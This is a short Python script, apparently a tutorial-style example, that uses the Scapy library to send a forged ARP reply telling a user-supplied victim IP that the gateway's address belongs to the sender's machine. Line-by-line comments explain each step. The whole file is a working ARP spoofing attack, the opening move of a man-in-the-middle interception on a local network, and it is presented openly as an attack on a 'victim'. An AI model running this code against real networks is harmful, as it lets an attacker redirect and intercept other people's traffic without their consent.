# Import all necessary functions and classes from Scapy
from scapy.all import *

# Ask the user to input the victim's IP address (the target of the attack)
victim_ip = input("Please enter victim's IP: ")

# Ask the user to input the gateway's IP address (the IP of the router or gateway)
gateway_ip = input("Please enter gateway's IP: ")

# Create the ARP spoofing packet
# ARP operates using different op codes. op=2 means ARP Reply (we're sending a fake reply)
# op=2 tells the victim that the gateway is at the attacker's MAC address, even though it's not
arp_spoof_packet = ARP(
    op = 2,
    pdst = victim_ip,
    psrc=gateway_ip
    )


# Send the ARP spoofing packet to the victim
# 'send()' sends the crafted ARP packet
# 'verbose=False' disables printing of the packet sending details to the terminal
send(arp_spoof_packet, verbose=False)
